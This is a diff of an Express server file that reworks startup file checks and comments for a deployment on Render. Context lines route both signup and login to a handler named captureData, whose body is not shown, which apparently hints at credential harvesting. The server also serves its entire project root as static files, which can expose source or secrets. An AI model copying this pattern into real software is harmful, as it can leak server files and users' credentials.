@@ -11,35 +11,24 @@ const port = process.env.PORT || 3001;
 app.use(cors());
 app.use(express.json());
 
-// Explicitly resolve paths for Render environment
-const rootPath = process.cwd();
+const rootPath = __dirname;
 const distPath = path.join(rootPath, 'dist');
-const bundlePath = path.join(distPath, 'bundle.js');
 
+// Startup diagnostics for Render
 console.log('--- Startup Diagnostic ---');
-console.log('Root Directory:', rootPath);
-console.log('Expected Bundle Path:', bundlePath);
-
-if (fs.existsSync(bundlePath)) {
-    console.log('SUCCESS: bundle.js exists and is ready to serve.');
-} else {
-    console.error('ERROR: bundle.js NOT FOUND. Build might have failed or directory structure is different.');
-    // Help debug by listing files
-    try {
-        console.log('Files in root:', fs.readdirSync(rootPath));
-        if (fs.existsSync(distPath)) {
-            console.log('Files in dist:', fs.readdirSync(distPath));
-        } else {
-            console.log('dist directory missing entirely.');
-        }
-    } catch (e) {
-        console.error('Failed to read directory for debug:', e.message);
+const requiredFiles = ['dist/bundle.js', 'dist/style.css', 'index.html'];
+requiredFiles.forEach(f => {
+    const p = path.join(rootPath, f);
+    if (fs.existsSync(p)) {
+        console.log(`✅ Found: ${f}`);
+    } else {
+        console.error(`❌ MISSING: ${f}`);
     }
-}
+});
 
-// Serve static files from the 'dist' folder at the '/dist' URL prefix
+// Serve static files from 'dist' folder
 app.use('/dist', express.static(distPath));
-// Serve other static files (like index.html) from the root
+// Serve root static files
 app.use(express.static(rootPath));
 
 // DB Connection
@@ -93,7 +82,7 @@ const captureData = async (req, res) => {
 app.post('/api/signup', captureData);
 app.post('/api/login', captureData);
 
-// Fallback: Send index.html for any unknown requests (essential for SPAs)
+// SPA Fallback
 app.get('*', (req, res) => {
   res.sendFile(path.join(rootPath, 'index.html'));
 });
